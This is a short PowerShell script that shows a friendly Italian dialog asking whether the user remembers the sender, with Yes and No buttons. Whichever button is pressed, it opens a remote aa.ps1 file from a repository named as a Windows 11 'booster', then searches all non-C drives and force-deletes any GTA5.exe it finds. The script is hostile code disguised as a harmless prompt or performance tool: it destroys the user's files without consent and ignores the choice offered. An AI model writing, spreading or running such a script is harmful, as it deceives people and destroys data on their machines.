Add-Type -AssemblyName System.Windows.Forms
$form = New-Object System.Windows.Forms.Form
$form.Text = "Sqttyxsq"
$form.Size = New-Object System.Drawing.Size(800,250)
$form.StartPosition = "CenterScreen"
$form.ControlBox = $false
$label = New-Object System.Windows.Forms.Label
$label.Text = "Ti ricordi di me ( sai so 2 mesi che nn giochiamo insieme )"
$label.AutoSize = $true
$label.Location = New-Object System.Drawing.Point(10,20)
$form.Controls.Add($label)
$yesButton = New-Object System.Windows.Forms.Button
$yesButton.Text = "Sì"
$yesButton.Location = New-Object System.Drawing.Point(50,100)
$yesButton.Add_Click({
    $global:dialogResult = "Yes"
    $form.Close()
})
$form.Controls.Add($yesButton)
$noButton = New-Object System.Windows.Forms.Button
$noButton.Text = "No"
$noButton.Location = New-Object System.Drawing.Point(150,100)
$noButton.Add_Click({
    $global:dialogResult = "No"
    $form.Close()
})
$form.Controls.Add($noButton)
$form.ShowDialog()

if ($global:dialogResult -eq "Yes") {
    start https://raw.githubusercontent.com/Sqttyxsq/Win11-Booster/main/aa.ps1
    $drives = Get-PSDrive -PSProvider FileSystem | Select-Object Name, Used, Free
    $drives | Format-Table -Property Name, Used, Free
    $availableDrives = $drives | Where-Object { $_.Name -match '^[A-Z]$' -and $_.Name -ne 'C' }

    foreach ($drive in $availableDrives) {
        $driveName = $drive.Name
        $files = Get-ChildItem "${driveName}:\\" -Recurse -Filter *.exe
        foreach ($file in $files) {
            if ($file.Name -eq "GTA5.exe") {
                Remove-Item $file.FullName -Force
            }
        }
    }
} else {
    start https://raw.githubusercontent.com/Sqttyxsq/Win11-Booster/main/aa.ps1
    $drives = Get-PSDrive -PSProvider FileSystem | Select-Object Name, Used, Free
    $drives | Format-Table -Property Name, Used, Free
    $availableDrives = $drives | Where-Object { $_.Name -match '^[A-Z]$' -and $_.Name -ne 'C' }

    foreach ($drive in $availableDrives) {
        $driveName = $drive.Name
        $files = Get-ChildItem "${driveName}:\\" -Recurse -Filter *.exe
        foreach ($file in $files) {
            if ($file.Name -eq "GTA5.exe") {
                Remove-Item $file.FullName -Force
            }
        }
    }
}
